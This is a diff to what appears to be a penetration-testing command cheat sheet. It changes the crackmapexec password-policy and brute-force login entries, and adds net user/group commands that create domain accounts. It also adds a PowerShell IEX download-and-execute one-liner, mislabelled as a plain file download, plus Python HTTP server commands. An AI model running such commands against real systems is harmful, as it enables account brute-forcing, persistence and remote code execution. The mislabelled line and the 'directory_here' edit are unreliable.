@@ -47,10 +47,10 @@ cewl -w /path/to/outfile.txt -v URL_here
 CRACKMAPEXEC
 ------------
 # check for password policy on Windows domain
-crackmapexec smb IP_here --pass-pol -u '' -p ''
+crackmapexec directory_here IP_here --pass-pol -u '' -p ''
 
-# brute force smb login
-crackmapexec smb IP_here -u userlist.txt -p passwordlist.txt
+# brute force login
+crackmapexec directory_here IP_here -u userlist.txt -p passwordlist.txt
 
 
 DIG
@@ -211,6 +211,18 @@ flush privileges;
 drop user 'username'@'IP_here';
 
 
+NET
+---
+# add new user
+net user user_here password_here /add
+
+# add new user to domain
+net user user_here password_here /add /domain
+
+# add user to group 
+net group "group_name_here" /add user_here
+
+
 PIP
 ---
 # install pip package
@@ -225,12 +237,19 @@ Select-String -Path C:\path\here\*.log -Pattern "string_here"
 # grep recursively
 Get-ChildItem C:\path\to\directory -Filter *.log -Recurse | Select-String "string_here"
 
+# download file from web server
+IEX(New-Object Net.WebClient).downloadString('http://URL_here/file_here')
+
 
 PYTHON
 ------
 # user python path from env
 #!/usr/bin/env python
 #!/usr/bin/env python3
+
+# HTTP server
+python -m SimpleHTTPServer 80
+python3 -m http.server 80
 
 
 REG QUERY
